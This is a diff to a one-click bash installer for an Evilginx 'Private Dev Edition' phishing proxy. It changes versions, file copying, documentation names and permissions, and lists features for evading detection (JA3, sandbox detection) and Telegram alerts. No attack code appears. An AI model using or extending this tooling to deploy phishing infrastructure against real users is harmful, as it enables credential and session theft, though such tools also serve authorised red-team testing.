@@ -4,7 +4,7 @@
 # Evilginx - Private Dev Edition - One-Click Installer
 #############################################################################
 # This script automates the complete installation and configuration process
-# Based on: DEPLOYMENT_GUIDE.md
+# Based on: DEPLOYMENT.md
 #
 # Supports: Ubuntu 20.04/22.04/24.04, Debian 11/12
 # Architectures: amd64, arm64
@@ -93,7 +93,7 @@ fi
 
 # Configuration
 EVILGINX_VERSION="3.3.1"
-GO_VERSION="1.25.0"
+GO_VERSION="1.25.8"
 INSTALL_DIR="/usr/local/bin"
 INSTALL_BASE="/opt/evilginx"
 SERVICE_USER="evilginx"  # Dedicated service user (least-privilege)
@@ -863,17 +863,18 @@ build_evilginx() {
     cp "$BUILD_DIR/build/evilginx" "$INSTALL_BASE/evilginx.bin"
     chmod +x "$INSTALL_BASE/evilginx.bin"
     
-    # Clean and copy essential directories (prevents stale files from prior installs)
-    log_info "Installing phishlets, redirectors, and web UI (clean copy)..."
-    rm -rf "$INSTALL_BASE/phishlets" "$INSTALL_BASE/redirectors" "$INSTALL_BASE/web"
-    cp -r "$BUILD_DIR/phishlets" "$INSTALL_BASE/"
-    cp -r "$BUILD_DIR/redirectors" "$INSTALL_BASE/"
+    # Install phishlets, redirectors, and web UI (using update mode to preserve custom files)
+    log_info "Installing phishlets, redirectors, and web UI..."
+    mkdir -p "$INSTALL_BASE/phishlets" "$INSTALL_BASE/redirectors" "$INSTALL_BASE/web"
+    cp -ru "$BUILD_DIR/phishlets/." "$INSTALL_BASE/phishlets/"
+    cp -ru "$BUILD_DIR/redirectors/." "$INSTALL_BASE/redirectors/"
     if [ -d "$BUILD_DIR/web" ]; then
-        cp -r "$BUILD_DIR/web" "$INSTALL_BASE/"
+        cp -ru "$BUILD_DIR/web/." "$INSTALL_BASE/web/"
     fi
     if [ -d "$BUILD_DIR/gophish/static" ]; then
         log_info "Installing Gophish static files and GeoIP database..."
-        cp -r "$BUILD_DIR/gophish/static" "$INSTALL_BASE/"
+        mkdir -p "$INSTALL_BASE/static"
+        cp -ru "$BUILD_DIR/gophish/static/." "$INSTALL_BASE/static/"
     fi
     
     # Create wrapper script with default paths at /usr/local/bin/evilginx
@@ -937,13 +938,10 @@ WRAPPEREOF
     # Copy all documentation
     log_info "Copying documentation to $INSTALL_BASE..."
     cp "$BUILD_DIR/README.md" "$INSTALL_BASE/" 2>/dev/null || true
-    cp "$BUILD_DIR/DEPLOYMENT_GUIDE.md" "$INSTALL_BASE/" 2>/dev/null || true
-    cp "$BUILD_DIR/BEST_PRACTICES.md" "$INSTALL_BASE/" 2>/dev/null || true
-    cp "$BUILD_DIR/SESSION_FORMATTING_GUIDE.md" "$INSTALL_BASE/" 2>/dev/null || true
-    cp "$BUILD_DIR/LINUX_VPS_SETUP.md" "$INSTALL_BASE/" 2>/dev/null || true
-    cp "$BUILD_DIR/TELEGRAM_NOTIFICATIONS.md" "$INSTALL_BASE/" 2>/dev/null || true
-    cp "$BUILD_DIR/NEW_PHISHLETS_GUIDE.md" "$INSTALL_BASE/" 2>/dev/null || true
-    cp "$BUILD_DIR/PATH_AUTO_DETECTION.md" "$INSTALL_BASE/" 2>/dev/null || true
+    cp "$BUILD_DIR/DEPLOYMENT.md" "$INSTALL_BASE/" 2>/dev/null || true
+    cp "$BUILD_DIR/LICENSE" "$INSTALL_BASE/" 2>/dev/null || true
+    cp "$BUILD_DIR/cloudflare-workers-deployment.md" "$INSTALL_BASE/" 2>/dev/null || true
+    
     chmod -R 755 "$PHISHLETS_DIR"
     chmod -R 755 "$REDIRECTORS_DIR"
     chown -R "$SERVICE_USER:$SERVICE_USER" "$INSTALL_BASE"
@@ -1156,6 +1154,10 @@ echo "Starting Evilginx in interactive mode..."
 echo "Press Ctrl+C to stop, then run 'evilginx-start' to resume service mode"
 echo ""
 evilginx -c /etc/evilginx
+
+# Ensure permissions are restored to service user if root modified anything
+echo "Restoring configuration ownership to $SERVICE_USER..."
+chown -R "$SERVICE_USER:$SERVICE_USER" /etc/evilginx
 EOF
     chmod +x /usr/local/bin/evilginx-console
     
@@ -1255,15 +1257,12 @@ display_completion() {
     echo "  • Configure Cloudflare DNS for your domain"
     echo "  • Enable advanced features (ML, JA3, Sandbox detection)"
     echo "  • Set up Telegram notifications for monitoring"
-    echo "  • Review DEPLOYMENT_GUIDE.md for complete setup"
+    echo "  • Review DEPLOYMENT.md for complete setup"
     echo "  • Check logs regularly: journalctl -u evilginx -f"
     echo ""
     
     echo -e "${GREEN}Documentation:${NC}"
-    echo "  • Main Guide:           /opt/evilginx/DEPLOYMENT_GUIDE.md"
-    echo "  • Session Formatting:   /opt/evilginx/SESSION_FORMATTING_GUIDE.md (NEW!)"
-    echo "  • Linux VPS Setup:      /opt/evilginx/LINUX_VPS_SETUP.md"
-    echo "  • Best Practices:       /opt/evilginx/BEST_PRACTICES.md"
+    echo "  • Deployment Guide:     /opt/evilginx/DEPLOYMENT.md"
     echo "  • README:               /opt/evilginx/README.md"
     echo ""
     
